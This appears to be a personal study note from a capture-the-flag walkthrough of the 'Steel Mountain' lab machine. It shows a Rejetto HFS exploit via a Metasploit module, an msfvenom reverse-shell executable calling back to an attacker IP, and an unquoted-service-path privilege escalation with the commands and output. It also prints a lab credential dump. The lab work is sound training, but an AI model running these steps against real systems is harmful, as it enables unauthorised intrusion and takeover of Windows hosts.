### [nmap.init.out](./nmap.init.out)
### [nmap.out](./nmap.out)

# port 80, 8080
- :8080 running rejetto http file server, vulnerable for CVE-2014-6287
- Metesploit
    - Modudle `exploit/windows/http/rejetto_hfs_exec`
    - Payload options `windows/shell_reverse_tcp`

# Privesc using Powersploit PowerUp
- [PowerSploit | Github](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- use `multi/manage/shell_to_meterpreter` to upgrade to a meterpreter shell, then use `upload` command to upload the PowerUp.ps1 to RHOST
- "To execute this using Meterpreter, I will type `load powershell` into meterpreter. Then I will enter powershell by entering `powershell_shell`"

```
AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced
SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteDa
ta/CreateFiles])
    Advanced SystemCare Service
```

```
  ???????????? Checking Credential manager
  ?  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
  [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
   Username:              STEELMOUNTAIN\bill
   Password:               PMBAf5KhZAxVhvqb
   Target:                STEELMOUNTAIN\bill
   PersistenceType:       Enterprise
   LastWriteTime:         9/27/2019 5:22:42 AM
```

- Use msfvenom to generate a payload as an Windows executable for reverse shell

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.240.61 LPORT=443 -e x86/shikata_ga_nai -f exe -o Advan
ced.exe
```

- Upload the new executable to AdvancedSystemCareService9 's path
```
meterpreter > upload Advanced.exe
[*] uploading  : /home/parallels/Advanced.exe -> Advanced.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/parallels/Advanced.exe -> Advanced.exe
[*] uploaded   : /home/parallels/Advanced.exe -> Advanced.exe
meterpreter > dir
Listing: C:\Program Files (x86)\IObit
=====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   32768  dir   2019-09-26 11:17:30 -0400  Advanced SystemCare
100777/rwxrwxrwx  73802  fil   2021-09-20 00:05:21 -0400  Advanced.exe
40777/rwxrwxrwx   16384  dir   2019-09-26 11:17:48 -0400  IObit Uninstaller
40777/rwxrwxrwx   4096   dir   2019-09-26 11:17:46 -0400  LiveUpdate

# start a netcat session listening for this

meterpreter > shell
Process 2640 created.
Channel 19 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9
[SC] ControlService FAILED 1062:

The service has not been started.


C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

# PrevSec Part II
- get a copy of [netcat.exe](./nc.exe.zip), and [this exploit](./39161.py)
- rename the netcat bin to nc.exe according to the exploit's description
- update port and ip in the exploit script
- run it twice!


Check out JH's walkthrough and reorganize this note!
https://zacheller.dev/thm-steelmountain